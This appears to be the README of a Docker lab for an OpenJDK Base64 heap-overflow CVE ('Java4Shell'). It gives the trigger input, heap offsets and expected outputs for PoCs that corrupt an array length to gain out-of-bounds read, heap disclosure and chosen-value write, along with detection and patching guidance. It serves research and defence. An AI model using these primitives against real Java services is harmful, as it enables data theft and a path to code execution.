# Java4Shell / Java2Shell — CVE-2026-114938 Lab

A reproducible, network-isolated Docker lab for **CVE-2026-114938**, the OpenJDK
HotSpot x86-64 AVX-512 Base64 decoder heap overflow publicly called
**Java4Shell** (also **Java2Shell**).

> **Educational / authorized testing only.**
> This lab deliberately corrupts its own JVM heap. Run it only in the provided
> disposable container, and never against a system you do not own. It stops at
> heap read/write and disclosure primitives; it does **not** include a
> weaponized RCE chain.

| | |
|---|---|
| **CVE** | CVE-2026-114938 |
| **Public names** | Java4Shell / Java2Shell |
| **Component** | OpenJDK HotSpot x86-64 AVX-512 VBMI Base64 intrinsic |
| **Impact** | Heap out-of-bounds write; heap read/write and disclosure primitives; RCE in product-specific chains |
| **Hardware gate** | x86-64 with `avx512f avx512bw avx512vbmi bmi2` (Ice Lake+ / Zen 4+) |
| **Affected branches** | OpenJDK 17 (from 17.0.6), 21, 25, 27 |
| **Lab scope** | Bounded trigger, length corruption, OOB read, heap leak, chosen-value OOB write |

## In one sentence

Java's fast Base64 decoder is told to write 0 bytes, an underflow turns that
into `-1`, the CPU treats `-1` as "write all 64 bytes", and 62 bytes spill past
the output buffer before Java throws an error.

## Status

Tested end-to-end on **2026-11-21** with:

- **Eclipse Temurin 21.0.13+9** (pre-fix; fixed in 21.0.13.1)
- **Intel SDE 10.13.1** (`sde64 -chip_check_disable -icx -- java ...`)
- An Intel **i5-7200U** host (Kaby Lake) with `avx avx2 bmi1 bmi2` but **no**
  AVX-512, so SDE spoofs an Ice Lake CPU
- Docker with `--cap-add=SYS_PTRACE --security-opt seccomp=unconfined
  --network none`

All five stages behaved as expected: `trigger`, `corrupt`, `leak`, and `write`
reproduced; `control` did not reproduce (which is the expected result).

On a real AVX-512 host, use `LAB_MODE=native` to skip SDE.

## Why this lab exists

The vulnerability is small, but exploiting it is not. The primary overflow
writes a **fixed pattern**; the attacker controls only where it lands. This lab
shows how that fixed write becomes a useful primitive:

1. A malformed Base64 tail causes a 64-byte masked store to overrun the
   decoder's output buffer.
2. The spill overwrites the length field of an adjacent Java array.
3. Java's normal bounds checks then trust the corrupted length.
4. Ordinary Java array reads and writes become out-of-bounds reads and writes.
5. The same corruption gives a heap-disclosure primitive ("JavaBleed").

The lab intentionally stops before the application-specific RCE chain.

## Affected versions

| Branch | Affected | Fixed |
|---|---|---|
| 17 | 17.0.6 through 17.0.21.0.3 | **17.0.21.1** |
| 21 | up to 21.0.13.0.3 | **21.0.13.1** |
| 25 | up to 25.0.5.0.3 | **25.0.5.1** |
| 27 | up to 27.0.1.0.3 | **27.0.1.1** |
| 8 (Oracle Enterprise Performance Pack only) | 8u511b33-perf | **8u513-perf** |

Standard Java 8 and 11 builds, and OpenJ9, are not affected. The bug was
introduced in OpenJDK 17.0.6. Branches 18–20, 22–24, and 26 have no fix; move
to a supported line.

## Hardware gate

The vulnerable stub only runs when **all four** CPU flags are present:

```text
avx512f avx512bw avx512vbmi bmi2
```

In practice: Intel Ice Lake, Sapphire Rapids, Emerald Rapids, or Granite
Rapids; or AMD Zen 4+. ARM64, older x86-64, and any x86-64 JVM started with
`-XX:UseAVX=2` never execute the vulnerable path.

The intrinsic is only reached after the C2 JIT compiles the decode path, so a
busy service needs a warm decoder.

## Requirements

- **x86-64 Linux Docker host.** Intel SDE/Pin does not work under ARM-to-x86
  emulation, so Apple Silicon and other ARM hosts are not supported.
- Docker with permission to add `SYS_PTRACE` and use `seccomp=unconfined` for
  the disposable container (Pin needs `ptrace`).
- ~1.5 GB free disk.
- Network access **at build time** for the JDK base image and SDE. Runtime is
  fully offline (`--network none`).

## Quick start

```bash
git clone https://github.com/akshutgoyal/Java4Shell.git
cd Java4Shell
chmod +x run.sh

./run.sh --build all     # build the image and run all five stages
```

Run individual stages:

```bash
./run.sh trigger     # bounded, non-destructive OOB-write measurement
./run.sh control     # -XX:-UseBASE64Intrinsics (expected: NOT REPRODUCED)
./run.sh corrupt     # heap corruption + OOB read
./run.sh leak        # JavaBleed-style heap disclosure
./run.sh write       # chosen-value OOB write into a neighbour
```

The first build downloads and SHA256-verifies Intel SDE from Intel's mirror.
The vulnerable Temurin image is pinned by digest.

### Plain Docker

```bash
docker build -t java4shell-lab:local .

docker run --rm \
  --cap-add=SYS_PTRACE \
  --security-opt seccomp=unconfined \
  --network none \
  --tmpfs /tmp:rw,nosuid,nodev,size=512m \
  java4shell-lab:local trigger
```

### Docker Compose

```bash
docker compose build
docker compose run --rm java4shell trigger
```

### Environment

| Variable | Values | Default |
|---|---|---|
| `LAB_MODE` | `auto`, `native`, `sde` | `auto` |
| `LAB_WARMUP` | number of valid decodes | `1000` |

`auto` uses the native JVM when `/proc/cpuinfo` has all four AVX-512 flags, and
SDE otherwise. Force it with `LAB_MODE=native` or `LAB_MODE=sde`.

On real AVX-512 hardware:

```bash
LAB_MODE=native ./run.sh all
```

## Expected output

### `trigger` — real 64-byte masked store

```text
rejected     = true
changed      = 62 (expected 62)
first        = 50 (expected 50)
last         = 111 (expected 111)
REPRODUCED
```

The decoder rejects the input, but 62 bytes starting at offset 50 have already
been overwritten inside the large canary array. The two bytes at offsets 48–49
are the in-bounds part of the same 64-byte store.

### `control` — `-XX:-UseBASE64Intrinsics`

```text
changed      = 0 (expected 62)
first        = -1 (expected 50)
last         = -1 (expected 111)
NOT REPRODUCED
```

The safe Java decoder never performs the wide store. This stage **exits 1 by
design**.

### `corrupt` — length corruption + OOB read

```text
length before   = 64 (java 64)
length after    = 1771742825 (java 1771742825)
CORRUPTED: victim length changed from 64 to 1771742825
OOB READ OK: victim[4096] = 0x73
OOB READ REPRODUCED
```

The victim's Java-visible length is now `0x699AA669` (1,771,742,825), and a
plain Java read at index 4096 succeeds.

### `leak` — JavaBleed-style disclosure

```text
length after  = 1771742825
leaked marker at victim[80] = J4S-SECRET-...
JAVA BLEED REPRODUCED
```

The corrupted length lets ordinary Java read across the object boundary into
a neighbouring `secret` array. The marker is a verification aid; in a real
target, the attacker would scan the leaked heap for keys, tokens, or PII.

### `write` — chosen-value OOB write

```text
length after  = 1771742825
target before = 41 41 41 41 41 41 41 41 ...
target after  = 42 43 44 45 46 47 48 49 4a 4b 4c 4d 4e 4f 50 51
OOB WRITE REPRODUCED
```

Ordinary Java stores at `victim[80+i]` land in the neighbouring `target` array
with attacker-chosen bytes.

**Notes**

- `./run.sh control` exits 1 by design. `./run.sh all` prints each stage's exit
  code and finishes with a summary, so the overall command exits 0.
- The exact leaked byte at `victim[4096]` and the random marker suffix can vary
  between runs; the length and offsets are deterministic with this layout.
- The heap layout is deterministic with this pinned image, but may miss on a
  different JVM or GC configuration. Re-run the stage if needed.

## How the bug works

For the tail of a Base64 input, the x86-64 intrinsic computes:

```text
input_mask  = BZHI(-1, input_len)
output_len  = (input_len / 4) * 3

if input[input_len - 1] == '=':
    output_len -= 1
    input_mask >>= 1
    if input[input_len - 2] == '=':
        output_len -= 1
        input_mask >>= 1

output_mask = BZHI(-1, output_len)
```

For `64 * "A" + "="` (65 bytes):

- The tail output length is `0 - 1 = -1`.
- `BZHI` looks only at the low 8 bits of the index: `-1` looks like `255`.
- Since `255 >= 64`, no bits are cleared, so the 64-bit mask is all ones.
- The masked store (`VMOVDQU8` / `evmovdqub`) writes all 64 bytes at offset 48
  of the 50-byte output array: **2 bytes in bounds, 62 bytes past the end**.
- The JVM then throws `IllegalArgumentException`, but the write has already
  happened.

The overflow bytes are stub-derived (`69 a6 9a ...`, and `0x9a` for the last
16 bytes), so the attacker controls **where** the write lands, not its
contents.

On JDK 17, the trigger is `128 * "A" + "="` (129 bytes); on JDK 21/25/27 it is
`64 * "A" + "="` (65 bytes).

## How the PoCs use the corruption

A Java `byte[]` has a 16-byte header: mark word, class pointer, and a 4-byte
length at object offset 12. Java's bounds checks read that length.

The heap PoCs allocate:

```text
[ dst: 66 bytes ][ victim: 64 bytes ][ target / secret: ... ]
```

- `dst` is 82 bytes of object (16-byte header + 66 data), rounded to 88 bytes.
- The 64-byte store starts at `dst` data offset 48.
- The `victim`'s length field lands at store offset 36.
- The bytes there are `69 a6 9a 69`, which Java reads as `0x699AA669`
  (1,771,742,825), a large positive length.

From that point on, `victim[4096]`, `victim[80]`, and `victim[80+i] = ...` are
ordinary Java array accesses that pass the JVM's bounds checks. `sun.misc.Unsafe`
is used only to read the length header before and after the decode; the actual
out-of-bounds accesses are plain Java bytecode.

| PoC | What it proves |
|---|---|
| `poc/Base64Trigger.java` | The intrinsic really performs the 64-byte masked store. The destination is 4 KiB, so all 62 overflow bytes stay inside a real array. |
| `poc/HeapCorruption.java` | A 66-byte destination places the next array's length field at store offset 36. The length becomes `0x699AA669`, and a normal Java read at index 4096 succeeds. |
| `poc/HeapLeak.java` | A neighbouring `secret` array is disclosed through ordinary Java reads on the now-huge victim. |
| `poc/HeapWrite.java` | The same corrupted length turns ordinary Java stores into a chosen-value OOB write into a neighbouring array. |

`HeapCorruption`, `HeapLeak`, and `HeapWrite` deliberately poison their own
heap and call `Runtime.getRuntime().halt()` before GC can traverse the corrupted
object. Run them only in the disposable container.

## Scope and limitations

- **No RCE chain.** The lab stops at read/write and disclosure. Calif's public
  write-up describes the next stages: corrupt a "writer" array's length, use it
  to corrupt a "reader" array's length, leak heap memory, repair damaged
  headers, groom G1/TLAB allocation, and eventually reach the JVM Code Cache.
  The product-specific chains were withheld by the researchers.
- **No universal payload.** A real chain needs a reachable decoder, a suitable
  heap layout, a live writer/reader pair or other feedback path, and
  application-specific timing. Network conditions matter.
- **Heap grooming is simplified here.** The pinned image gives deterministic
  TLAB adjacency. Real targets need G1/TLAB grooming, spraying, and retries.
- **SDE is CPU emulation, not bug emulation.** It spoofs an Ice Lake CPUID so
  HotSpot generates the real AVX-512 stub; SDE executes the actual JVM machine
  code.
- **x86-64 Linux only.** The lab is `amd64`-only. Intel SDE/Pin does not work
  under ARM-to-x86 emulation.

## Detection

Check the CPU gate and every JVM, including JDKs bundled inside products and
container images:

```bash
uname -m
grep -m1 '^flags' /proc/cpuinfo | tr ' ' '\n' \
  | grep -E '^(avx512f|avx512bw|avx512vbmi|bmi2)$'
java -version
```

All four flags must be present. Also look for `hs_err_pid*` files and JVM exits
with codes 134/139.

Important:

- Inside containers, `/proc/cpuinfo` reflects the host CPU. A safe node today
  can be rescheduled onto a vulnerable CPU tomorrow; use CPU checks to
  prioritize patching, not to dismiss findings.
- Patching the host package does not update a JDK bundled inside a product or
  image. Check each runtime separately.

## Mitigation

1. **Patch and restart.** Upgrade to 17.0.21.1, 21.0.13.1, 25.0.5.1, or
   27.0.1.1 (or the distributor's equivalent), then restart every JVM and
   rebuild every image.
2. **Temporary JVM flag** (either one disables the vulnerable path):
   ```bash
   -XX:-UseBASE64Intrinsics
   # or, on x86-64 only:
   -XX:UseAVX=2
   ```
   `UseAVX` is x86-only; on ARM the JVM fails to start with
   `Unrecognized VM option 'UseAVX=2'`.
3. **Application input check.** Reject Base64 whose length, after stripping
   whitespace, is not a multiple of 4 before calling `decode`. This blocks the
   trigger but is not a general fix for every decoder route.
4. **WAF signatures** are supplementary; they do not repair the runtime.
5. **If you were exposed, assume compromise.** Patching does not undo a
   successful heap disclosure or RCE. Review JVM crashes, unexpected
   processes, and secrets that may have been in the heap.

## Cleanup

```bash
docker image rm java4shell-lab:local
# if you used Compose:
docker compose down --rmi local --volumes
```

The build downloads SDE from Intel's mirror and verifies SHA256. SDE is Intel
software under the Intel Simplified Software License; it is downloaded at build
time and is not redistributed by this repository.

## Repository layout

```text
Dockerfile              pinned vulnerable Temurin + SHA256-verified SDE
run.sh                  plain-Docker launcher
scripts/run-lab.sh      stage runner (native / SDE / auto)
poc/Base64Trigger.java  bounded, non-destructive trigger
poc/HeapCorruption.java length corruption + OOB read
poc/HeapLeak.java       JavaBleed-style heap disclosure
poc/HeapWrite.java      chosen-value OOB write
compose.yaml            optional Compose configuration
```

## References

- JFrog Security Research: [Java4Shell: What We Know About the Critical OpenJDK RCE Vulnerability](https://research.jfrog.com/post/java4shell-vulnerability/)
- Calif technical write-up and PoC: [Java4Shell: Write once, RCE everywhere](https://calif.io/java4shell/)
- OpenJDK advisory (2026-11-17): <https://openjdk.org/groups/vulnerability/advisories/2026-11-17>
- Oracle Critical Security Patch Update (November 2026): <https://www.oracle.com/security-alerts/cspunov2026.html>
- NVD: <https://nvd.nist.gov/vuln/detail/CVE-2026-114938>
- CVE record: <https://www.cve.org/CVERecord?id=CVE-2026-114938>

## Credits and licensing

- Vulnerability research, technical write-up, and the original bounded trigger
  PoC: **Quang Luong / Calif**.
- Original bug report and root-cause analysis: **sundarms** and
  **albertnetymk** (per Calif's disclosure timeline).
- Lab containerization and heap-corruption PoCs: repository owner.

No open-source license has been specified for this repository. The bounded
trigger follows the publicly published PoC in Calif's write-up; credit for that
work belongs to Calif. Add a license only after confirming the terms of all
referenced material.
